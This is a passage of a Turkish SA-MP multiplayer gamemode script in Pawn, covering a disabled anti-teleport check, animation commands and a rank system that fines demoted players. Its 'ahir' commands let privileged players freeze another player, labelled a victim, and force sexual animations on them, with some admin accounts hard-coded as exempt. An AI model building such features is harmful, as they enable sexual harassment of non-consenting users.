	if(BirSureBakmaTamam[playerid] == 0) { SetTimerEx("SetPlayerPos", 1000, false, "ifff", playerid, X, Y, Z); return 1; }
	BirSureBakmaTamam[playerid] = 0;
	SetTimerEx("_TPPlayer", 300, false, "ifff", playerid, X, Y, Z);
	return 1;
}*/
/*
forward _TPPlayer(playerid, Float:X, Float:Y, Float:Z);
public _TPPlayer(playerid, Float:X, Float:Y, Float:Z)
{
    SonOyuncuPos[playerid][0] = X;
    SonOyuncuPos[playerid][1] = Y;
    SonOyuncuPos[playerid][2] = Z;
	SetPlayerPos(playerid, X, Y, Z);
	SetTimerEx("_OKTPPlayer", 300, false, "i", playerid);
}

forward _OKTPPlayer(playerid);
public _OKTPPlayer(playerid)
{
	BirSureBakmaTamam[playerid] = 1;
}

AntiTPSafePlayer(playerid)
{
	GetPlayerPos(playerid, SonOyuncuPos[playerid][0], SonOyuncuPos[playerid][1], SonOyuncuPos[playerid][2]);
	SetTimerEx("_OKTPPlayer", 300, false, "i", playerid);
}*/

/*SpawnPlayer(playerid)
{
	BirSureBakmaTamam[playerid] = 0;
	SetTimerEx("_SPPlayer", 300, false, "i", playerid);
}*/

forward _SPPlayer(playerid);
public _SPPlayer(playerid)
{
	SpawnPlayer(playerid);
}

/*ControlAntiTeleport(playerid)
{
	if(BirSureBakmaTamam[playerid] == 0 || APlayerData[playerid][LoggedIn] == false) return 1;
	new Float:oX, Float:oY, Float:oZ;
	GetPlayerPos(playerid, oX, oY, oZ);

	new Float:oUzaklik = VectorSize(SonOyuncuPos[playerid][0]-oX, SonOyuncuPos[playerid][1]-oY, SonOyuncuPos[playerid][2]-oZ);

	if(oUzaklik > 100.0)
	{
	    new Yazi[128];
	    format(Yazi, 128, "{FF0000}%s {F8F8FF}sunucudan yasaklandý. [ Teleport Hilesi ]", GetName(playerid));
	    SendClientMessageToAll(-1, Yazi);
	    SafeBan(playerid);
	}else{
		SonOyuncuPos[playerid][0] = oX;
 		SonOyuncuPos[playerid][1] = oY;
  		SonOyuncuPos[playerid][2] = oZ;
	}
	return 1;
}*/

// ************************************************************************************************************************************************************
// Ahýr Sistemi & Animasyonlar [ EvoturK ]
// ************************************************************************************************************************************************************
PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}

CMD:animlist(playerid, params[])
{
	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{80FFFF}Animasyonlar", "{F8F8FF}/31 /ellerhavaya /telefonac /telefonkapat /silahcek\n{F8F8FF}/uzan /saklan /elsalla /saplakat /emrah\n{F8F8FF}/sigara[1-2] /bira /sarap /kola /otur /konus\n{F8F8FF}/nevarlan /sandalyeotur /dans /dus /duskalk /hayatziplamasi\n{F8F8FF}/ise /sarjor /striptiz /saril /yagmurduasi /oradadurliseli /sabri /burakyilmaz", "Kapat", "");
	return 1;
}

CMD:ahir(playerid, params[])
{
	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
	{
		if(Ahirin[playerid] == -1)
		{
		    new tmp[128], idx;
		    tmp = strtok(params, idx);
		    if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /ahir {FF0000}[Kurban ID]");
			new id = strval(tmp);

		    if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Oyuncu oyunda deðil!");
			if(!strcmp("NicqsiZAcent", GetName(id), true)) return 1;
			if(!strcmp("TeaMStar", GetName(id), true)) return 1;
			if(!strcmp("Tiger", GetName(id), true)) return 1;
			if(!strcmp("Ghostevil", GetName(id), true)) return 1;
			if(AhirKurban[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyuncuyu baþka biri ahýra atmýþ!");
		    if(Ahirin[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyuncuyu þuan baþka birini ahýra atmýþ!");

		    Ahirin[playerid] = id;
		    AhirKurban[id] = playerid;

			new Float:oX, Float:oY, Float:oZ, Float:oRot;
			GetPlayerPos(playerid, oX, oY, oZ);
		    GetPlayerFacingAngle(playerid, oRot);

		    oX += 0.2 * floatcos(oRot + 90, degrees);
		    oY += 0.2 * floatsin(oRot + 90, degrees);

			TogglePlayerControllable(Ahirin[playerid], 0);
			SetPlayerSkin(Ahirin[playerid], 145);
			SetPlayerPos(Ahirin[playerid], oX, oY, oZ);
			SetPlayerFacingAngle(Ahirin[playerid], oRot);

			ApplyAnimation(playerid, "KISSING", "Grlfrd_Kiss_02", 4.0, 1, 1, 1, 1, -1, 1);
			ApplyAnimation(playerid, "KISSING", "Grlfrd_Kiss_02", 4.0, 1, 1, 1, 1, -1, 1);

			//format(tmp, 128, "{7FFFD4}%s {FF69B4}%s{F8F8FF}'yi ahýra attý. [ Pozisyon: Ahýr Classics ]", GetName(playerid), GetName(id));
			//SendClientMessageToAll(-1, tmp);
		}else{
			TogglePlayerControllable(Ahirin[playerid], 1);
		    AhirKurban[ Ahirin[playerid] ] = -1;
			Ahirin[playerid] = -1;

		    ClearAnimations(playerid);
		}
	}
	return 1;
}

CMD:ahirjob(playerid, params[])
{
	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
	if(Ahirin[playerid] == -1)
	{
	    new tmp[128], idx;
	    tmp = strtok(params, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /ahir {FF0000}[Kurban ID]");
		new id = strval(tmp);

	    if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Oyuncu oyunda deðil!");
		if(!strcmp("TeaMStar", GetName(id), true)) return 1;
		if(!strcmp("NicqsiZAcent", GetName(id), true)) return 1;
		if(!strcmp("Tiger", GetName(id), true)) return 1;
		if(!strcmp("Ghostevil", GetName(id), true)) return 1;

		if(AhirKurban[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyuncuyu baþka biri ahýra atmýþ!");
	    if(Ahirin[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyuncuyu þuan baþka birini ahýra atmýþ!");

	    Ahirin[playerid] = id;
	    AhirKurban[id] = playerid;

		new Float:oX, Float:oY, Float:oZ, Float:oRot;
		GetPlayerPos(playerid, oX, oY, oZ);
	    GetPlayerFacingAngle(playerid, oRot);

	    oX += 0.38 * floatcos(oRot + 90, degrees);
	    oY += 0.38 * floatsin(oRot + 90, degrees);

		TogglePlayerControllable(Ahirin[playerid], 0);
		SetPlayerSkin(Ahirin[playerid], 145);
		SetPlayerPos(Ahirin[playerid], oX, oY, oZ);
		SetPlayerFacingAngle(Ahirin[playerid], oRot + 180.0);

		ApplyAnimation(Ahirin[playerid], "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, -1, 1);
		ApplyAnimation(Ahirin[playerid], "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, -1, 1);
		ApplyAnimation(playerid, "BLOWJOBZ","BJ_COUCH_LOOP_P", 4.0, 0, 1, 1, 1, -1, 1);
		ApplyAnimation(playerid, "BLOWJOBZ","BJ_COUCH_LOOP_P", 4.0, 0, 1, 1, 1, -1, 1);

		//format(tmp, 128, "{7FFFD4}%s {FF69B4}%s{F8F8FF}'yi ahýra attý. [ Pozisyon: Ahýrjob ]", GetName(playerid), GetName(id));
		//SendClientMessageToAll(-1, tmp);
	}else{
		TogglePlayerControllable(Ahirin[playerid], 1);
	    AhirKurban[ Ahirin[playerid] ] = -1;
		Ahirin[playerid] = -1;

	    ClearAnimations(playerid);
	}
	}
	return 1;
}

CMD:ahirdoggy(playerid, params[])
{
	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
	if(Ahirin[playerid] == -1)
	{
	    new tmp[128], idx;
	    tmp = strtok(params, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}Kullaným: /ahir {FF0000}[Kurban ID]");
		new id = strval(tmp);

	    if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Oyuncu oyunda deðil!");
		if(!strcmp("NicqsiZAcent", GetName(id), true)) return 1;
		if(!strcmp("TeaMStar", GetName(id), true)) return 1;
		if(!strcmp("Tiger", GetName(id), true)) return 1;
		if(!strcmp("", GetName(id), true)) return 1;

		if(AhirKurban[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyuncuyu baþka biri ahýra atmýþ!");
	    if(Ahirin[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Oyuncuyu þuan baþka birini ahýra atmýþ!");

	    Ahirin[playerid] = id;
	    AhirKurban[id] = playerid;

		new Float:oX, Float:oY, Float:oZ, Float:oRot;
		GetPlayerPos(playerid, oX, oY, oZ);
	    GetPlayerFacingAngle(playerid, oRot);

	    oX += 0.2 * floatcos(oRot + 90, degrees);
	    oY += 0.2 * floatsin(oRot + 90, degrees);

		TogglePlayerControllable(Ahirin[playerid], 0);
		SetPlayerSkin(Ahirin[playerid], 145);
		SetPlayerPos(Ahirin[playerid], oX, oY, oZ);
		SetPlayerFacingAngle(Ahirin[playerid], oRot);

		ApplyAnimation(AhirKurban[playerid], "SNM", "SPANKING_IDLEW", 4.0, 0, 1, 1, 1, -1, 1);

		//format(tmp, 128, "{7FFFD4}%s {FF69B4}%s{F8F8FF}'yi ahýra attý. [ Pozisyon: Ahýrdoggy ]", GetName(playerid), GetName(id));
		//SendClientMessageToAll(-1, tmp);
	}else{
		TogglePlayerControllable(Ahirin[playerid], 1);
	    AhirKurban[ Ahirin[playerid] ] = -1;
		Ahirin[playerid] = -1;

	    ClearAnimations(playerid);
	}
 }
	return 1;
}

CMD:31(playerid, params[])
{
	ApplyAnimation(playerid, "PAULNMAC", "wank_loop", 1.8, 1, 0, 0, 1, 600, 1);
	return 1;
}

CMD:ellerhavaya(playerid, params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:telefonac(playerid, params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
	return 1;
}

CMD:telefonkapat(playerid, params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
	return 1;
}

CMD:silahcek(playerid, params[])
{
	ApplyAnimation(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0, 1); // Rob
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:uzan(playerid, params[])
{
	ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0, 1); // Lay down
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:saklan(playerid, params[])
{
	ApplyAnimation(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0, 1); // Taking Cover
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:elsalla(playerid, params[])
{
	ApplyAnimation(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0, 1); // Wave
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:saplakat(playerid, params[])
{
	ApplyAnimation(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0, 1); // Ass Slapping
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:emrah(playerid, params[])
{
	ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0, 1); // Dieing of Crack
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:sigara1(playerid, params[])
{
	ApplyAnimation(playerid,"SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0, 1); // Smoke
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:sigara2(playerid, params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
	return 1;
}

CMD:bira(playerid, params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_BEER);
	return 1;
}

CMD:sarap(playerid, params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE);
	return 1;
}

CMD:kola(playerid, params[])
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK);
	return 1;
}

CMD:otur(playerid, params[])
{
	ApplyAnimation(playerid,"BEACH", "ParkSit_M_loop", 4.0, 1, 0, 0, 0, 0, 1); // Sit
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}
CMD:otur2(playerid, params[])
{
	ApplyAnimation(playerid,"INT_OFFICE", "OFF_Sit_Bored_Loop", 1.800001, 1, 0, 0, 1, 600);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}
CMD:konus(playerid, params[])
{
	ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,1,0,0,0,0, 1);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:nevarlan(playerid, params[])
{
	ApplyAnimation(playerid,"PED","fucku",4.0,0,0,0,0,0);
	return 1;
}

CMD:sandalyeotur(playerid, params[])
{
	ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.0,1,0,0,0,0, 1);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:dans(playerid, params[])
{
	new tmp[256], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp) || strlen(tmp) > 2) return SendClientMessage(playerid, -1, "{F8F8FF}/dans {FF0000}[1-4]");

	new	dancestyle = strval(tmp);
	if(dancestyle < 1 || dancestyle > 4) return SendClientMessage(playerid, -1, "{F8F8FF}/dans {FF0000}[1-4]");

	switch(dancestyle)
	{
	    case 1: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
	    case 2: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
	    case 3: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
	    case 4: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
	}
	return 1;
}

CMD:dus(playerid, params[])
{
	ApplyAnimation(playerid,"PED","KO_skid_front",4.1,0,1,1,1,0, 1);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:duskalk(playerid, params[])
{
	ApplyAnimation(playerid, "PED","FLOOR_hit_f", 4.0, 1, 0, 0, 0, 0, 1);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:hayatziplamasi(playerid, params[])
{
	ApplyAnimation(playerid,"PED","EV_dive",4.0,0,1,1,1,0, 1);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {00CED1}/animkapat {ADFF2F}yazabilirsiniz.");
	return 1;
}

CMD:ise(playerid, params[])
{
	SetPlayerSpecialAction(playerid, 68);
	return 1;
}

CMD:sarjor(playerid, params[])
{
	new tmp[256], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendClientMessage(playerid, -1, "{F8F8FF}/sarjor {FF0000}[deagle/smg/ak/m4]");
	if(!strcmp("deagle",tmp,true))
 	{
		ApplyAnimation(playerid,"COLT45","colt45_reload",4.0,0,0,0,0,1, 1);
  	}
   	else if(!strcmp("smg",tmp,true) || !strcmp("ak",tmp,true) || !strcmp("m4",tmp,true))
   	{
		ApplyAnimation(playerid,"UZI","UZI_reload",4.0,0,0,0,0,0, 1);
  	}
	return 1;
}

CMD:striptiz(playerid, params[])
{
	new tmp[256], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp) || strlen(tmp) > 2) return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}/striptiz {FF0000}[A-G]");

	switch(tmp[0])
	{
		case 'a', 'A': ApplyAnimation(playerid,"STRIP", "strip_A", 4.1, 1, 1, 1, 1, 1 );
 		case 'b', 'B': ApplyAnimation(playerid,"STRIP", "strip_B", 4.1, 1, 1, 1, 1, 1 );
  		case 'c', 'C': ApplyAnimation(playerid,"STRIP", "strip_C", 4.1, 1, 1, 1, 1, 1 );
   		case 'd', 'D': ApplyAnimation(playerid,"STRIP", "strip_D", 4.1, 1, 1, 1, 1, 1 );
    	case 'e', 'E': ApplyAnimation(playerid,"STRIP", "strip_E", 4.1, 1, 1, 1, 1, 1 );
    	case 'f', 'F': ApplyAnimation(playerid,"STRIP", "strip_F", 4.1, 1, 1, 1, 1, 1 );
    	case 'g', 'G': ApplyAnimation(playerid,"STRIP", "strip_G", 4.1, 1, 1, 1, 1, 1 );
    	default: SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}/striptiz {4876FF}[A-G]");
   	}
	return 1;
}

CMD:saril(playerid, params[])
{
	ApplyAnimation(playerid, "BD_FIRE", "GRLFRD_KISS_03", 4.0, 0, 0, 0, 0, 0, 1);
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {FFCC00}/animkapat {FFFFFF}yazabilirsiniz.");
	return 1;
}

CMD:yagmurduasi(playerid, params[])
{
	ApplyAnimation(playerid, "CAMERA", "CAMSTND_IDLELOOP", 4.0, 1, 0, 0, 0, 0, 1); // /yagmurduasi
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {FFCC00}/animkapat {FFFFFF}yazabilirsiniz.");
	return 1;
}

CMD:oradadurliseli(playerid, params[])
{
	ApplyAnimation(playerid, "CAMERA", "CAMCRCH_STAY", 4.0, 0, 0, 0, 0, 0, 1); // /oradadurliseli
	return 1;
}

CMD:sabri(playerid, params[])
{
	ApplyAnimation(playerid, "DAM_JUMP", "DAM_LAND", 4.0, 1, 0, 0, 0, 0, 1); // nabyyosunuzsabribey
	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Animasyonu sonlandýrmak için {FFCC00}/animkapat {FFFFFF}yazabilirsiniz.");
	return 1;
}

CMD:animkapat(playerid, params[])
{
	ClearAnimations(playerid);
	return 1;
}

// ************************************************************************************************************************************************************
// Rank Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:ranklar(playerid, params[])
{
	new DiaYazi[2000];
	for(new i; i < sizeof(TruckerRanks); i++)
	{
	    if(Rank[playerid] == i)
		{
		    format(DiaYazi, 2000, "%s{ADFF2F}", DiaYazi);
		}else{
		    format(DiaYazi, 2000, "%s{F8F8FF}", DiaYazi);
		}

		switch(APlayerData[playerid][PlayerClass])
		{
		    case ClassTruckDriver: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, TruckerRanks[i][RankName], TruckerRanks[i][RankScore]);
		    case ClassBusDriver: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, BusDriverRanks[i][RankName], BusDriverRanks[i][RankScore]);
		    case ClassDolmusDriver: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, DolmusDriverRanks[i][RankName], BusDriverRanks[i][RankScore]);
		    case ClassPilot: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, PilotRanks[i][RankName], PilotRanks[i][RankScore]);
		    case ClassPolice: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, PoliceRanks[i][RankName], PoliceRanks[i][RankScore]);
		    case ClassMafia: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, MafiaRanks[i][RankName], MafiaRanks[i][RankScore]);
  		    case ClassRoadWorker: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, RoadWorkerRanks[i][RankName], RoadWorkerRanks[i][RankScore]);
  		    case ClassGemici: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, GemiciRanks[i][RankName], GemiciRanks[i][RankScore]);
		    case ClassOduncu: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, OduncuRanks[i][RankName], OduncuRanks[i][RankScore]);
  		    case ClassBalikci: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, BalikciRanks[i][RankName], BalikciRanks[i][RankScore]);
  		    case ClassCopcu: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, CopcuRanks[i][RankName], CopcuRanks[i][RankScore]);
  		    case ClassBanka: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, BankaRanks[i][RankName], BankaRanks[i][RankScore]);
  		    case ClassFire: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, FireRanks[i][RankName], FireRanks[i][RankScore]);
  		    case ClassFBY: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, FBYRanks[i][RankName], FBYRanks[i][RankScore]);
  		    case ClassPboy: format(DiaYazi, 2000, "%s%s (%d Skor)\n", DiaYazi, PboyRanks[i][RankName], PboyRanks[i][RankScore]);
		}
	}

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{00FF00}Rank Listesi", DiaYazi, "Kapat", "");
	return 1;
}

RankControl(playerid)
{
	if(APlayerSpawnData[playerid] == false) return 1;

	new Yazi[128], MayRanko;
	for(new i; i < sizeof(TruckerRanks); i++)
	{
	    if(GetPlayerScore(playerid) >= TruckerRanks[i][RankScore])
	    {
	        MayRanko = i;
	    }
	}

	if(Rank[playerid] > MayRanko)
	{
	    Rank[playerid] = MayRanko;

		switch(APlayerData[playerid][PlayerClass])
		{
 			case ClassTruckDriver: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), TruckerRanks[MayRanko][RankName], MayRanko);
   			case ClassBusDriver: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), BusDriverRanks[MayRanko][RankName], MayRanko);
	    	case ClassDolmusDriver: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), DolmusDriverRanks[MayRanko][RankName], MayRanko);
	    	case ClassPilot: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), PilotRanks[MayRanko][RankName], MayRanko);
	    	case ClassPolice: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), PoliceRanks[MayRanko][RankName], MayRanko);
	    	case ClassMafia: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), MafiaRanks[MayRanko][RankName], MayRanko);
	    	case ClassRoadWorker: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), RoadWorkerRanks[MayRanko][RankName], MayRanko);
	    	case ClassGemici: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), GemiciRanks[MayRanko][RankName], MayRanko);
	    	case ClassOduncu: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), OduncuRanks[MayRanko][RankName], MayRanko);
	    	case ClassBalikci: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), BalikciRanks[MayRanko][RankName], MayRanko);
            case ClassCopcu: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), CopcuRanks[MayRanko][RankName], MayRanko);
            case ClassBanka: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), BankaRanks[MayRanko][RankName], MayRanko);
            case ClassFire: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), FireRanks[MayRanko][RankName], MayRanko);
            case ClassFBY: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), FBYRanks[MayRanko][RankName], MayRanko);
            case ClassPboy: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank düþerek {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), PboyRanks[MayRanko][RankName], MayRanko);
		}

		SendClientMessageToAll(-1, Yazi);
				if(MayRanko == 2)
 {
		RewardPlayer(playerid, -100000, -10);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 100k Para ve 10 Skor ceza aldý");
  } else
  	if(MayRanko == 3)
 {
		RewardPlayer(playerid, -150000, -15);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 150k Para ve 15 Skor ceza aldý");
  } else
   	if(MayRanko == 4)
 {
		RewardPlayer(playerid, -300000, -25);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 300k Para ve 25 Skor ceza aldý");
  } else
   	if(MayRanko == 5)
 {
		RewardPlayer(playerid, -450000, -25);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 450k Para ve 25 Skor ceza aldý");
  } else
   	if(MayRanko == 6)
 {
		RewardPlayer(playerid, -500000, -30);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 500k Para ve 30 Skor ceza aldý");
  } else
   	if(MayRanko == 7)
 {
		RewardPlayer(playerid, -1000000, -50);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 1M Para ve 50 Skor ceza aldý");
  } else
   	if(MayRanko == 8)
 {
		RewardPlayer(playerid, -1500000, -55);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 1,5M Para ve 55 Skor ceza aldý");
  } else
   	if(MayRanko == 9)
 {
		RewardPlayer(playerid, -2000000, -60);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 2M Para ve 60 Skor ceza aldý");
  } else
   	if(MayRanko == 10)
 {
		RewardPlayer(playerid, -3000000, -70);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 3M Para ve 70 Skor ceza aldý");
  } else
  	if(MayRanko == 11)
 {
		RewardPlayer(playerid, -3500000, -100);
		SendClientMessageToAll(-1, "{ff5555}RANK: Oyuncu Rank düþtüðü için 3,5M Para ve 100 Skor ceza aldý");
  }
	}else if(Rank[playerid] < MayRanko)
	{
	    Rank[playerid] = MayRanko;

		switch(APlayerData[playerid][PlayerClass])
		{
 			case ClassTruckDriver: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), TruckerRanks[MayRanko][RankName], MayRanko);
   			case ClassBusDriver: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), BusDriverRanks[MayRanko][RankName], MayRanko);
	    	case ClassDolmusDriver: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), DolmusDriverRanks[MayRanko][RankName], MayRanko);
	    	case ClassPilot: format(Yazi, 128, "{FFCC00}» {FFFFFF}%s {F8F8FF}Rank atlayarak {FF0000}%s ( Rank %d ) {F8F8FF}oldu.", GetName(playerid), PilotRanks[MayRanko][RankName], MayRanko);
